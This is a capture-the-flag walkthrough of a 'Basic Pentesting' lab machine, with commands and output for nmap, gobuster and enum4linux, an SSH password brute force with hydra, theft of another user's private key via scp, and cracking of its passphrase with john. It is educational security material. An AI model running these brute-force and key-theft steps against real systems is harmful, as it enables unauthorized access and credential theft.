# Basic Pentesting


1. Enumerate with nmap
```
root@ip-10-10-2-135:~# sudo nmap -sS -A 10.10.112.215

Starting Nmap 7.60 ( https://nmap.org ) at 2022-01-18 05:41 GMT
Nmap scan report for ip-10-10-112-215.eu-west-1.compute.internal (10.10.112.215)
Host is up (0.00058s latency).
Not shown: 994 closed ports
PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 db:45:cb:be:4a:8b:71:f8:e9:31:42:ae:ff:f8:45:e4 (RSA)
|   256 09:b9:b9:1c:e0:bf:0e:1c:6f:7f:fe:8e:5f:20:1b:ce (ECDSA)
|_  256 a5:68:2b:22:5f:98:4a:62:21:3d:a2:e2:c5:a9:f7:c2 (EdDSA)
80/tcp   open  http        Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
8009/tcp open  ajp13       Apache Jserv (Protocol v1.3)
| ajp-methods: 
|_  Supported methods: GET HEAD POST OPTIONS
8080/tcp open  http        Apache Tomcat 9.0.7
|_http-favicon: Apache Tomcat
|_http-open-proxy: Proxy might be redirecting requests
|_http-title: Apache Tomcat/9.0.7
MAC Address: 02:83:58:6B:98:7F (Unknown)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.60%E=4%D=1/18%OT=22%CT=1%CU=31822%PV=Y%DS=1%DC=D%G=Y%M=028358%T
OS:M=61E65330%P=x86_64-pc-linux-gnu)SEQ(SP=FA%GCD=1%ISR=10B%TI=Z%CI=I%TS=8)
OS:OPS(O1=M2301ST11NW7%O2=M2301ST11NW7%O3=M2301NNT11NW7%O4=M2301ST11NW7%O5=
OS:M2301ST11NW7%O6=M2301ST11)WIN(W1=68DF%W2=68DF%W3=68DF%W4=68DF%W5=68DF%W6
OS:=68DF)ECN(R=Y%DF=Y%T=40%W=6903%O=M2301NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=
OS:O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD
OS:=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0
OS:%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1
OS:(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI
OS:=N%T=40%CD=S)

Network Distance: 1 hop
Service Info: Host: BASIC2; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: -1s, deviation: 0s, median: -1s
|_nbstat: NetBIOS name: BASIC2, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: basic2
|   NetBIOS computer name: BASIC2\x00
|   Domain name: \x00
|   FQDN: basic2
|_  System time: 2022-01-18T00:42:02-05:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2022-01-18 05:42:02
|_  start_date: 1600-12-31 23:58:45

TRACEROUTE
HOP RTT     ADDRESS
1   0.58 ms ip-10-10-112-215.eu-west-1.compute.internal (10.10.112.215)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 33.54 seconds
```

2. Use gobuster to find the hidden directory `/development`
```
root@ip-10-10-2-135:~# gobuster dir -w /usr/share/wordlists/dirb/common.txt -u http://10.10.112.215/
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.112.215/
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirb/common.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2022/01/18 05:45:40 Starting gobuster
===============================================================
/.hta (Status: 403)
/.htpasswd (Status: 403)
/.htaccess (Status: 403)
/development (Status: 301)
/index.html (Status: 200)
/server-status (Status: 403)
===============================================================
2022/01/18 05:45:40 Finished
===============================================================
```

3. Use enum4linux to find content in smb, we find users `kay` and `jan`
```
root@ip-10-10-2-135:~# enum4linux -a 10.10.112.215
WARNING: polenum.py is not in your path.  Check that package is installed and your PATH is sane.
WARNING: ldapsearch is not in your path.  Check that package is installed and your PATH is sane.
Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Tue Jan 18 05:47:52 2022

 ========================== 
|    Target Information    |
 ========================== 
Target ........... 10.10.112.215
RID Range ........ 500-550,1000-1050
Username ......... ''
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none


 ===================================================== 
|    Enumerating Workgroup/Domain on 10.10.112.215    |
 ===================================================== 
[+] Got domain/workgroup name: WORKGROUP

 ============================================= 
|    Nbtstat Information for 10.10.112.215    |
 ============================================= 
Looking up status of 10.10.112.215
	BASIC2          <00> -         B <ACTIVE>  Workstation Service
	BASIC2          <03> -         B <ACTIVE>  Messenger Service
	BASIC2          <20> -         B <ACTIVE>  File Server Service
	..__MSBROWSE__. <01> - <GROUP> B <ACTIVE>  Master Browser
	WORKGROUP       <00> - <GROUP> B <ACTIVE>  Domain/Workgroup Name
	WORKGROUP       <1d> -         B <ACTIVE>  Master Browser
	WORKGROUP       <1e> - <GROUP> B <ACTIVE>  Browser Service Elections

	MAC Address = 00-00-00-00-00-00

 ====================================== 
|    Session Check on 10.10.112.215    |
 ====================================== 
[+] Server 10.10.112.215 allows sessions using username '', password ''

 ============================================ 
|    Getting domain SID for 10.10.112.215    |
 ============================================ 
Domain Name: WORKGROUP
Domain Sid: (NULL SID)
[+] Can't determine if host is part of domain or part of a workgroup

 ======================================= 
|    OS information on 10.10.112.215    |
 ======================================= 
Use of uninitialized value $os_info in concatenation (.) or string at /root/Desktop/Tools/Miscellaneous/enum4linux.pl line 464.
[+] Got OS info for 10.10.112.215 from smbclient: 
[+] Got OS info for 10.10.112.215 from srvinfo:
	BASIC2         Wk Sv PrQ Unx NT SNT Samba Server 4.3.11-Ubuntu
	platform_id     :	500
	os version      :	6.1
	server type     :	0x809a03

 ============================== 
|    Users on 10.10.112.215    |
 ============================== 
Use of uninitialized value $users in print at /root/Desktop/Tools/Miscellaneous/enum4linux.pl line 876.
Use of uninitialized value $users in pattern match (m//) at /root/Desktop/Tools/Miscellaneous/enum4linux.pl line 879.

Use of uninitialized value $users in print at /root/Desktop/Tools/Miscellaneous/enum4linux.pl line 892.
Use of uninitialized value $users in pattern match (m//) at /root/Desktop/Tools/Miscellaneous/enum4linux.pl line 894.

 ========================================== 
|    Share Enumeration on 10.10.112.215    |
 ========================================== 
WARNING: The "syslog" option is deprecated

	Sharename       Type      Comment
	---------       ----      -------
	Anonymous       Disk      
	IPC$            IPC       IPC Service (Samba Server 4.3.11-Ubuntu)
Reconnecting with SMB1 for workgroup listing.

	Server               Comment
	---------            -------

	Workgroup            Master
	---------            -------
	WORKGROUP            BASIC2

[+] Attempting to map shares on 10.10.112.215
//10.10.112.215/Anonymous	Mapping: OK, Listing: OK
//10.10.112.215/IPC$	[E] Can't understand response:
WARNING: The "syslog" option is deprecated
NT_STATUS_OBJECT_NAME_NOT_FOUND listing \*

 ===================================================== 
|    Password Policy Information for 10.10.112.215    |
 ===================================================== 
[E] Dependent program "polenum.py" not present.  Skipping this check.  Download polenum from http://labs.portcullis.co.uk/application/polenum/


 =============================== 
|    Groups on 10.10.112.215    |
 =============================== 

[+] Getting builtin groups:

[+] Getting builtin group memberships:

[+] Getting local groups:

[+] Getting local group memberships:

[+] Getting domain groups:

[+] Getting domain group memberships:

 ======================================================================== 
|    Users on 10.10.112.215 via RID cycling (RIDS: 500-550,1000-1050)    |
 ======================================================================== 
[I] Found new SID: S-1-22-1
[I] Found new SID: S-1-5-21-2853212168-2008227510-3551253869
[I] Found new SID: S-1-5-32
[+] Enumerating users using SID S-1-5-32 and logon username '', password ''
S-1-5-32-500 *unknown*\*unknown* (8)
S-1-5-32-501 *unknown*\*unknown* (8)
S-1-5-32-502 *unknown*\*unknown* (8)
S-1-5-32-503 *unknown*\*unknown* (8)
S-1-5-32-504 *unknown*\*unknown* (8)
S-1-5-32-505 *unknown*\*unknown* (8)
S-1-5-32-506 *unknown*\*unknown* (8)
S-1-5-32-507 *unknown*\*unknown* (8)
S-1-5-32-508 *unknown*\*unknown* (8)
S-1-5-32-509 *unknown*\*unknown* (8)
S-1-5-32-510 *unknown*\*unknown* (8)
S-1-5-32-511 *unknown*\*unknown* (8)
S-1-5-32-512 *unknown*\*unknown* (8)
S-1-5-32-513 *unknown*\*unknown* (8)
S-1-5-32-514 *unknown*\*unknown* (8)
S-1-5-32-515 *unknown*\*unknown* (8)
S-1-5-32-516 *unknown*\*unknown* (8)
S-1-5-32-517 *unknown*\*unknown* (8)
S-1-5-32-518 *unknown*\*unknown* (8)
S-1-5-32-519 *unknown*\*unknown* (8)
S-1-5-32-520 *unknown*\*unknown* (8)
S-1-5-32-521 *unknown*\*unknown* (8)
S-1-5-32-522 *unknown*\*unknown* (8)
S-1-5-32-523 *unknown*\*unknown* (8)
S-1-5-32-524 *unknown*\*unknown* (8)
S-1-5-32-525 *unknown*\*unknown* (8)
S-1-5-32-526 *unknown*\*unknown* (8)
S-1-5-32-527 *unknown*\*unknown* (8)
S-1-5-32-528 *unknown*\*unknown* (8)
S-1-5-32-529 *unknown*\*unknown* (8)
S-1-5-32-530 *unknown*\*unknown* (8)
S-1-5-32-531 *unknown*\*unknown* (8)
S-1-5-32-532 *unknown*\*unknown* (8)
S-1-5-32-533 *unknown*\*unknown* (8)
S-1-5-32-534 *unknown*\*unknown* (8)
S-1-5-32-535 *unknown*\*unknown* (8)
S-1-5-32-536 *unknown*\*unknown* (8)
S-1-5-32-537 *unknown*\*unknown* (8)
S-1-5-32-538 *unknown*\*unknown* (8)
S-1-5-32-539 *unknown*\*unknown* (8)
S-1-5-32-540 *unknown*\*unknown* (8)
S-1-5-32-541 *unknown*\*unknown* (8)
S-1-5-32-542 *unknown*\*unknown* (8)
S-1-5-32-543 *unknown*\*unknown* (8)
S-1-5-32-544 BUILTIN\Administrators (Local Group)
S-1-5-32-545 BUILTIN\Users (Local Group)
S-1-5-32-546 BUILTIN\Guests (Local Group)
S-1-5-32-547 BUILTIN\Power Users (Local Group)
S-1-5-32-548 BUILTIN\Account Operators (Local Group)
S-1-5-32-549 BUILTIN\Server Operators (Local Group)
S-1-5-32-550 BUILTIN\Print Operators (Local Group)
S-1-5-32-1000 *unknown*\*unknown* (8)
S-1-5-32-1001 *unknown*\*unknown* (8)
S-1-5-32-1002 *unknown*\*unknown* (8)
S-1-5-32-1003 *unknown*\*unknown* (8)
S-1-5-32-1004 *unknown*\*unknown* (8)
S-1-5-32-1005 *unknown*\*unknown* (8)
S-1-5-32-1006 *unknown*\*unknown* (8)
S-1-5-32-1007 *unknown*\*unknown* (8)
S-1-5-32-1008 *unknown*\*unknown* (8)
S-1-5-32-1009 *unknown*\*unknown* (8)
S-1-5-32-1010 *unknown*\*unknown* (8)
S-1-5-32-1011 *unknown*\*unknown* (8)
S-1-5-32-1012 *unknown*\*unknown* (8)
S-1-5-32-1013 *unknown*\*unknown* (8)
S-1-5-32-1014 *unknown*\*unknown* (8)
S-1-5-32-1015 *unknown*\*unknown* (8)
S-1-5-32-1016 *unknown*\*unknown* (8)
S-1-5-32-1017 *unknown*\*unknown* (8)
S-1-5-32-1018 *unknown*\*unknown* (8)
S-1-5-32-1019 *unknown*\*unknown* (8)
S-1-5-32-1020 *unknown*\*unknown* (8)
S-1-5-32-1021 *unknown*\*unknown* (8)
S-1-5-32-1022 *unknown*\*unknown* (8)
S-1-5-32-1023 *unknown*\*unknown* (8)
S-1-5-32-1024 *unknown*\*unknown* (8)
S-1-5-32-1025 *unknown*\*unknown* (8)
S-1-5-32-1026 *unknown*\*unknown* (8)
S-1-5-32-1027 *unknown*\*unknown* (8)
S-1-5-32-1028 *unknown*\*unknown* (8)
S-1-5-32-1029 *unknown*\*unknown* (8)
S-1-5-32-1030 *unknown*\*unknown* (8)
S-1-5-32-1031 *unknown*\*unknown* (8)
S-1-5-32-1032 *unknown*\*unknown* (8)
S-1-5-32-1033 *unknown*\*unknown* (8)
S-1-5-32-1034 *unknown*\*unknown* (8)
S-1-5-32-1035 *unknown*\*unknown* (8)
S-1-5-32-1036 *unknown*\*unknown* (8)
S-1-5-32-1037 *unknown*\*unknown* (8)
S-1-5-32-1038 *unknown*\*unknown* (8)
S-1-5-32-1039 *unknown*\*unknown* (8)
S-1-5-32-1040 *unknown*\*unknown* (8)
S-1-5-32-1041 *unknown*\*unknown* (8)
S-1-5-32-1042 *unknown*\*unknown* (8)
S-1-5-32-1043 *unknown*\*unknown* (8)
S-1-5-32-1044 *unknown*\*unknown* (8)
S-1-5-32-1045 *unknown*\*unknown* (8)
S-1-5-32-1046 *unknown*\*unknown* (8)
S-1-5-32-1047 *unknown*\*unknown* (8)
S-1-5-32-1048 *unknown*\*unknown* (8)
S-1-5-32-1049 *unknown*\*unknown* (8)
S-1-5-32-1050 *unknown*\*unknown* (8)
[+] Enumerating users using SID S-1-5-21-2853212168-2008227510-3551253869 and logon username '', password ''
S-1-5-21-2853212168-2008227510-3551253869-500 *unknown*\*unknown* (8)
S-1-5-21-2853212168-2008227510-3551253869-501 BASIC2\nobody (Local User)
S-1-5-21-2853212168-2008227510-3551253869-502 *unknown*\*unknown* (8)
S-1-5-21-2853212168-2008227510-3551253869-503 *unknown*\*unknown* (8)
S-1-5-21-2853212168-2008227510-3551253869-504 *unknown*\*unknown* (8)
S-1-5-21-2853212168-2008227510-3551253869-505 *unknown*\*unknown* (8)
S-1-5-21-2853212168-2008227510-3551253869-506 *unknown*\*unknown* (8)
S-1-5-21-2853212168-2008227510-3551253869-507 *unknown*\*unknown* (8)
S-1-5-21-2853212168-2008227510-3551253869-508 *unknown*\*unknown* (8)
S-1-5-21-2853212168-2008227510-3551253869-509 *unknown*\*unknown* (8)
S-1-5-21-2853212168-2008227510-3551253869-510 *unknown*\*unknown* (8)
S-1-5-21-2853212168-2008227510-3551253869-511 *unknown*\*unknown* (8)
S-1-5-21-2853212168-2008227510-3551253869-512 *unknown*\*unknown* (8)
S-1-5-21-2853212168-2008227510-3551253869-513 BASIC2\None (Domain Group)
S-1-5-21-2853212168-2008227510-3551253869-514 *unknown*\*unknown* (8)
S-1-5-21-2853212168-2008227510-3551253869-515 *unknown*\*unknown* (8)
S-1-5-21-2853212168-2008227510-3551253869-516 *unknown*\*unknown* (8)
S-1-5-21-2853212168-2008227510-3551253869-517 *unknown*\*unknown* (8)
S-1-5-21-2853212168-2008227510-3551253869-518 *unknown*\*unknown* (8)
S-1-5-21-2853212168-2008227510-3551253869-519 *unknown*\*unknown* (8)
S-1-5-21-2853212168-2008227510-3551253869-520 *unknown*\*unknown* (8)
S-1-5-21-2853212168-2008227510-3551253869-521 *unknown*\*unknown* (8)
S-1-5-21-2853212168-2008227510-3551253869-522 *unknown*\*unknown* (8)
S-1-5-21-2853212168-2008227510-3551253869-523 *unknown*\*unknown* (8)
S-1-5-21-2853212168-2008227510-3551253869-524 *unknown*\*unknown* (8)
S-1-5-21-2853212168-2008227510-3551253869-525 *unknown*\*unknown* (8)
S-1-5-21-2853212168-2008227510-3551253869-526 *unknown*\*unknown* (8)
S-1-5-21-2853212168-2008227510-3551253869-527 *unknown*\*unknown* (8)
S-1-5-21-2853212168-2008227510-3551253869-528 *unknown*\*unknown* (8)
S-1-5-21-2853212168-2008227510-3551253869-529 *unknown*\*unknown* (8)
S-1-5-21-2853212168-2008227510-3551253869-530 *unknown*\*unknown* (8)
S-1-5-21-2853212168-2008227510-3551253869-531 *unknown*\*unknown* (8)
S-1-5-21-2853212168-2008227510-3551253869-532 *unknown*\*unknown* (8)
S-1-5-21-2853212168-2008227510-3551253869-533 *unknown*\*unknown* (8)
S-1-5-21-2853212168-2008227510-3551253869-534 *unknown*\*unknown* (8)
S-1-5-21-2853212168-2008227510-3551253869-535 *unknown*\*unknown* (8)
S-1-5-21-2853212168-2008227510-3551253869-536 *unknown*\*unknown* (8)
S-1-5-21-2853212168-2008227510-3551253869-537 *unknown*\*unknown* (8)
S-1-5-21-2853212168-2008227510-3551253869-538 *unknown*\*unknown* (8)
S-1-5-21-2853212168-2008227510-3551253869-539 *unknown*\*unknown* (8)
S-1-5-21-2853212168-2008227510-3551253869-540 *unknown*\*unknown* (8)
S-1-5-21-2853212168-2008227510-3551253869-541 *unknown*\*unknown* (8)
S-1-5-21-2853212168-2008227510-3551253869-542 *unknown*\*unknown* (8)
S-1-5-21-2853212168-2008227510-3551253869-543 *unknown*\*unknown* (8)
S-1-5-21-2853212168-2008227510-3551253869-544 *unknown*\*unknown* (8)
S-1-5-21-2853212168-2008227510-3551253869-545 *unknown*\*unknown* (8)
S-1-5-21-2853212168-2008227510-3551253869-546 *unknown*\*unknown* (8)
S-1-5-21-2853212168-2008227510-3551253869-547 *unknown*\*unknown* (8)
S-1-5-21-2853212168-2008227510-3551253869-548 *unknown*\*unknown* (8)
S-1-5-21-2853212168-2008227510-3551253869-549 *unknown*\*unknown* (8)
S-1-5-21-2853212168-2008227510-3551253869-550 *unknown*\*unknown* (8)
S-1-5-21-2853212168-2008227510-3551253869-1000 *unknown*\*unknown* (8)
S-1-5-21-2853212168-2008227510-3551253869-1001 *unknown*\*unknown* (8)
S-1-5-21-2853212168-2008227510-3551253869-1002 *unknown*\*unknown* (8)
S-1-5-21-2853212168-2008227510-3551253869-1003 *unknown*\*unknown* (8)
S-1-5-21-2853212168-2008227510-3551253869-1004 *unknown*\*unknown* (8)
S-1-5-21-2853212168-2008227510-3551253869-1005 *unknown*\*unknown* (8)
S-1-5-21-2853212168-2008227510-3551253869-1006 *unknown*\*unknown* (8)
S-1-5-21-2853212168-2008227510-3551253869-1007 *unknown*\*unknown* (8)
S-1-5-21-2853212168-2008227510-3551253869-1008 *unknown*\*unknown* (8)
S-1-5-21-2853212168-2008227510-3551253869-1009 *unknown*\*unknown* (8)
S-1-5-21-2853212168-2008227510-3551253869-1010 *unknown*\*unknown* (8)
S-1-5-21-2853212168-2008227510-3551253869-1011 *unknown*\*unknown* (8)
S-1-5-21-2853212168-2008227510-3551253869-1012 *unknown*\*unknown* (8)
S-1-5-21-2853212168-2008227510-3551253869-1013 *unknown*\*unknown* (8)
S-1-5-21-2853212168-2008227510-3551253869-1014 *unknown*\*unknown* (8)
S-1-5-21-2853212168-2008227510-3551253869-1015 *unknown*\*unknown* (8)
S-1-5-21-2853212168-2008227510-3551253869-1016 *unknown*\*unknown* (8)
S-1-5-21-2853212168-2008227510-3551253869-1017 *unknown*\*unknown* (8)
S-1-5-21-2853212168-2008227510-3551253869-1018 *unknown*\*unknown* (8)
S-1-5-21-2853212168-2008227510-3551253869-1019 *unknown*\*unknown* (8)
S-1-5-21-2853212168-2008227510-3551253869-1020 *unknown*\*unknown* (8)
S-1-5-21-2853212168-2008227510-3551253869-1021 *unknown*\*unknown* (8)
S-1-5-21-2853212168-2008227510-3551253869-1022 *unknown*\*unknown* (8)
S-1-5-21-2853212168-2008227510-3551253869-1023 *unknown*\*unknown* (8)
S-1-5-21-2853212168-2008227510-3551253869-1024 *unknown*\*unknown* (8)
S-1-5-21-2853212168-2008227510-3551253869-1025 *unknown*\*unknown* (8)
S-1-5-21-2853212168-2008227510-3551253869-1026 *unknown*\*unknown* (8)
S-1-5-21-2853212168-2008227510-3551253869-1027 *unknown*\*unknown* (8)
S-1-5-21-2853212168-2008227510-3551253869-1028 *unknown*\*unknown* (8)
S-1-5-21-2853212168-2008227510-3551253869-1029 *unknown*\*unknown* (8)
S-1-5-21-2853212168-2008227510-3551253869-1030 *unknown*\*unknown* (8)
S-1-5-21-2853212168-2008227510-3551253869-1031 *unknown*\*unknown* (8)
S-1-5-21-2853212168-2008227510-3551253869-1032 *unknown*\*unknown* (8)
S-1-5-21-2853212168-2008227510-3551253869-1033 *unknown*\*unknown* (8)
S-1-5-21-2853212168-2008227510-3551253869-1034 *unknown*\*unknown* (8)
S-1-5-21-2853212168-2008227510-3551253869-1035 *unknown*\*unknown* (8)
S-1-5-21-2853212168-2008227510-3551253869-1036 *unknown*\*unknown* (8)
S-1-5-21-2853212168-2008227510-3551253869-1037 *unknown*\*unknown* (8)
S-1-5-21-2853212168-2008227510-3551253869-1038 *unknown*\*unknown* (8)
S-1-5-21-2853212168-2008227510-3551253869-1039 *unknown*\*unknown* (8)
S-1-5-21-2853212168-2008227510-3551253869-1040 *unknown*\*unknown* (8)
S-1-5-21-2853212168-2008227510-3551253869-1041 *unknown*\*unknown* (8)
S-1-5-21-2853212168-2008227510-3551253869-1042 *unknown*\*unknown* (8)
S-1-5-21-2853212168-2008227510-3551253869-1043 *unknown*\*unknown* (8)
S-1-5-21-2853212168-2008227510-3551253869-1044 *unknown*\*unknown* (8)
S-1-5-21-2853212168-2008227510-3551253869-1045 *unknown*\*unknown* (8)
S-1-5-21-2853212168-2008227510-3551253869-1046 *unknown*\*unknown* (8)
S-1-5-21-2853212168-2008227510-3551253869-1047 *unknown*\*unknown* (8)
S-1-5-21-2853212168-2008227510-3551253869-1048 *unknown*\*unknown* (8)
S-1-5-21-2853212168-2008227510-3551253869-1049 *unknown*\*unknown* (8)
S-1-5-21-2853212168-2008227510-3551253869-1050 *unknown*\*unknown* (8)
[+] Enumerating users using SID S-1-22-1 and logon username '', password ''
S-1-22-1-1000 Unix User\kay (Local User)
S-1-22-1-1001 Unix User\jan (Local User)

 ============================================== 
|    Getting printer info for 10.10.112.215    |
 ============================================== 
No printers returned.


enum4linux complete on Tue Jan 18 05:48:07 2022
```

4. Use hydra to brute force the ssh password for `jan`: `armando`
```
root@ip-10-10-2-135:~# hydra -l jan -P /usr/share/wordlists/rockyou.txt 10.10.112.215 ssh
Hydra v8.6 (c) 2017 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (http://www.thc.org/thc-hydra) starting at 2022-01-18 05:50:24
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344398 login tries (l:1/p:14344398), ~896525 tries per task
[DATA] attacking ssh://10.10.112.215:22/
[STATUS] 258.00 tries/min, 258 tries in 00:01h, 14344142 to do in 926:38h, 16 active
[STATUS] 246.00 tries/min, 738 tries in 00:03h, 14343662 to do in 971:48h, 16 active
[22][ssh] host: 10.10.112.215   login: jan   password: armando
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 2 final worker threads did not complete until end.
[ERROR] 2 targets did not resolve or could not be connected
[ERROR] 16 targets did not complete
Hydra (http://www.thc.org/thc-hydra) finished at 2022-01-18 05:53:47
```

5. Ssh into the target machine with jan's credentials. Go to kay's home folder and see `pass.bak`, but we don't have permissions to read it. Go into kay's `.ssh` folder and we see that we have permissions to read the private key file `id_rsa`

6. Use scp to copy the private key file onto our machine and change permissions with `chmod 600 id_rsa`
```
root@ip-10-10-2-135:~# scp jan@10.10.112.215:/home/kay/.ssh/id_rsa .
jan@10.10.112.215's password: 
id_rsa                                        100% 3326     4.4MB/s   00:00  
```

7. Try to login as kay with the private key, but we need a private key passphrase
```
root@ip-10-10-2-135:~# ssh -i id_rsa kay@10.10.112.215
Enter passphrase for key 'id_rsa': 
```

8. Brute force the passphrase with john the ripper. [This](https://null-byte.wonderhowto.com/how-to/crack-ssh-private-key-passwords-with-john-ripper-0302810/) was the guide I used. Download the `ssh2john.py` file from the [john the ripper github](https://github.com/openwall/john/blob/bleeding-jumbo/run/ssh2john.py). Use it with `python3 ssh2john.py id_rsa > hash`, which creates a hash that we can crack. Now use `john --wordlist=/usr/share/wordlists/rockyou.txt hash` to crack it and find that the passphrase is `beeswax`
```
root@ip-10-10-2-135:~# john --wordlist=/usr/share/wordlists/rockyou.txt hash 
Note: This format may emit false positives, so it will keep trying even after finding a
possible candidate.
Warning: detected hash type "SSH", but the string is also recognized as "ssh-opencl"
Use the "--format=ssh-opencl" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
beeswax          (id_rsa)
1g 0:00:00:09 DONE (2022-01-18 06:05) 0.1039g/s 1490Kp/s 1490Kc/s 1490KC/s *7¡Vamos!
Session completed. 
```

9. Login as kay with `ssh -i id_rsa kay@10.10.112.215`, use the passphrase, then print out the contents of `pass.bak` to get `heresareallystrongpasswordthatfollowsthepasswordpolicy$$`
